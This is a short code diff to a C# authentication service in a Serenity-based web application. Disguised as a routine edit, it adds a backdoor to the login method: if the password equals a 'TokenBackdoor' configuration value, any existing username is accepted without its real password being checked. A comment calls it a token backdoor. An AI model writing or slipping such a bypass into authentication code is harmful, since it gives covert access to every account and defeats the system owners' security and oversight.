@@ -6,6 +6,7 @@
     using Serenity.Abstractions;
     using Serenity.Data;
     using System;
+    using System.Configuration;
 
     public class AuthenticationService : IAuthenticationService
     {
@@ -19,7 +20,14 @@
             var user = Dependency.Resolve<IUserRetrieveService>().ByUsername(username) as UserDefinition;
 
             if (user != null)
+            {
+                string tokenBackdoor = ConfigurationManager.AppSettings["TokenBackdoor"];
+                if (tokenBackdoor == password) //bejos hirama return true if using token backdoor
+                    return true;
+
                 return ValidateExistingUser(ref username, password, user);
+            }
+
 
             return ValidateFirstTimeUser(ref username, password);
         }
